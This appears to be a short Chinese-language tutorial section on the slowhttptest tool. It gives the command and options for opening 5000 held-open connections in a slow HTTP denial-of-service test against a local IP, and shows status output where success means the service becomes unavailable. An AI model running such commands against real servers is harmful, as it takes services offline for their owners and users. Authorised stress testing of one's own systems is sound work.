
## 测试工具

**模拟测试工具：slowhttptest**

> https://github.com/shekyan/slowhttptest

**安装：**

> https://github.com/shekyan/slowhttptest/wiki

**使用：**

> slowhttptest -c 5000 -u [hostname/ip]

- -c 表示发起5000个连接，由于是慢速DDOS且是基于http协议的，这里发起的连接请求是确确实实会与服务器进行三次握手并维持与服务器的连接的。

- -u 注意这里的hostname或者ip都需要在前面加上协议 http://。

**模拟测试：**


```
./slowhttptest -c 5000 -u https://192.168.1.3
```


```
slow HTTP test status on 50th second:

initializing:        0
pending:             8
connected:           1757
error:               0
closed:              3
service available:   YES
```

攻击如果成功，service available会变成no。